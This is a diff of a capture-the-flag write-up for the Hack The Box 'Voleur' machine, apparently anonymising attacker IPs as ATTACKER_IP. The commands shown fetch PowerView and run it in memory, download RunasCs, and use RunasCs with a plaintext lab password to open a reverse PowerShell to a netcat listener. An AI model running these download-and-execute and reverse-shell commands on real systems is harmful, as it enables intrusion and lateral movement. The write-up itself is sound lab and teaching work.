@@ -673,8 +673,8 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 And downloaded it with `Invoke-WebRequest` (`iwr`) and then imported it using `Invoke-Expression` (`iex`) on the target server.
 
 ```
-*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> iex (iwr http://10.10.14.95:8000/PowerView.ps1 -UseBasicParsing)
-iex (iwr http://10.10.14.95:8000/PowerView.ps1 -UseBasicParsing)
+*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> iex (iwr http://ATTACKER_IP:8000/PowerView.ps1 -UseBasicParsing)
+iex (iwr http://ATTACKER_IP:8000/PowerView.ps1 -UseBasicParsing)
 ```
 
 `Convert-NameToSid` was then used to get the SID for `Restore_Users`.
@@ -737,7 +737,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 ```
 *Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd $env:temp
-*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> iwr -uri http://10.10.14.54:8000/RunasCs.exe -outfile RunasCs.exe
+*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> iwr -uri http://ATTACKER_IP:8000/RunasCs.exe -outfile RunasCs.exe
 *Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> ls RunasCs.exe
 
 
@@ -759,7 +759,7 @@ listening on [any] 4444 ..
 `RunasCs` was executed with the remote `-r` option to run `powershell.exe` as `svc_ldap` and redirect the shell to the `nc` listener.
 
 ```
-*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.95:4444
+*Evil-WinRM* PS C:\Users\svc_winrm\AppData\Local\Temp> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r ATTACKER_IP:4444
 ```
 
 `nc` caught the reverse shell, and `whoami` confirmed that the shell was running as user `svc_ldap`.
@@ -767,7 +767,7 @@ listening on [any] 4444 ..
 ```
 fcoomans@kali:~/htb/voleur$ rlwrap nc -lvnp 4444
 listening on [any] 4444 ...
-connect to [10.10.14.95] from (UNKNOWN) [10.10.11.76] 54347
+connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.76] 54347
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
